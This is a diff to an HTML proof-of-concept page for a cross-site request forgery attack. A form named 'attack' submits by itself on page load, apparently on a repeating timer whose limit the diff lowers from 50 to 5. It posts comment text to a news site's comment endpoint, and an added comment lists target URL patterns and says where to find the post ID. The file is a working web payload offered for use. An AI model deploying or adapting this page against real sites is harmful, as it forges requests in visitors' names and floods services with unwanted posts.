@@ -3,7 +3,7 @@
 <script type="text/javascript">
     let qtd = 0;
     let seconds = 2;
-    const limit = 50;
+    const limit = 5;
 
     function send() {
         if (qtd < limit) {
@@ -20,10 +20,18 @@
     }
 </script>
 
+<!--
+http://www.test.com/?pag=news&str=VIEW&id=ID-HERE&cmd=comment
+OR
+https://www.test.com/site/index.php/news/comments/add/ID-HERE
+
+The ID can be found in the source code of the page
+-->
+
 <body onload="start();">
-<form action="http://www.test.com/?pag=news&str=VIEW&id=ID-HERE&cmd=comment" name="attack" method="POST" target="_blank">
-    <input type="text" name="Character" id="Character" value="Test">
-    <input type="text" name="Text" id="Text" value="CSRF POST DETECTED">
+<form action="URL-HERE" name="attack" method="POST" target="_blank">
+    <input type="text" name="Character" value="CSRF">
+    <input type="text" name="Text" value="CSRF POST DETECTED">
     <input type="hidden" name="action" value="true">
     <input type="submit" value="Send">
 </form>
